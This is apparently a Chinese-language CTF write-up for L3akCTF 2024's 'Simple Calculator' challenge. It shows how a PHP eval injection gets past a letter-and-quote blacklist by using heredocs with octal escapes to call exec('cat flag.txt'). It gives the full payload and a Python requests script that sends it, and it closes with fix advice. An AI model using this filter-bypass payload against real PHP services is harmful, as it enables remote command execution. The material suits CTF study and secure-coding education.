# L3akCTF 2024 Simple Calculator Writeup

## 题目简述

PHP 页面把 GET 参数 `formula` 直接拼入 `eval`：

```php
eval('$calc = ' . $formula . ';');
```

过滤器限制长度小于 150，并禁止大小写字母、单引号和双引号。目标是在不直接出现函数名与命令文本的情况下构造 PHP 字符串，再利用可调用字符串执行 `exec("cat flag.txt")`。

## 解题过程

过滤正则为：

```php
preg_match('/[a-z\'"]+/i', $formula)
```

它没有禁止反斜杠、数字、下划线、括号、换行和 `<`。PHP heredoc 的结束标识符可以只用下划线 `_`，内容又会像双引号字符串一样解释八进制转义。

先用八进制表示 `exec`：

```text
e    x    e    c
145  170  145  143
```

再编码 `cat flag.txt`：

```text
c   a   t       f   l   a   g   .   t   x   t
143 141 164 040 146 154 141 147 056 164 170 164
```

由此构造两个 heredoc。第一个求值为字符串 `exec`，紧接圆括号即可把它作为函数名调用；第二个求值为命令参数：

```php
(<<<_
\145\170\145\143
_)(<<<_
\143\141\164\40\146\154\141\147\56\164\170\164
_)
```

服务端最终执行的代码等价于：

```php
$calc = ("exec")("cat flag.txt");
```

请求脚本如下，`requests` 会自动 URL 编码换行、反斜杠和 `<`：

```python
import requests

base_url = "http://target/"

payload = r"""(<<<_
\145\170\145\143
_)(<<<_
\143\141\164\40\146\154\141\147\56\164\170\164
_)"""

response = requests.get(
    base_url,
    params={"formula": payload},
)
response.raise_for_status()
print(response.text)
```

`exec` 返回命令输出的最后一行，赋给 `$calc` 后被页面打印：

```text
Result: L3AK{PhP_Web_Ch@ll3ng3}
```

## 方法总结

- 对 `eval` 使用字符黑名单无法建立安全边界；PHP 有 heredoc、转义序列、变量函数等多种等价表示。
- 八进制转义让函数名与命令在源输入中不出现任何字母，但在 PHP 解释阶段恢复成普通字符串。
- heredoc 标识符也受语法约束，使用 `_` 可以避开字母过滤；换行必须原样保留并正确 URL 编码。
- 正确修复是删除 `eval`，使用专门的表达式解析器，并只实现允许的数字与算术运算。
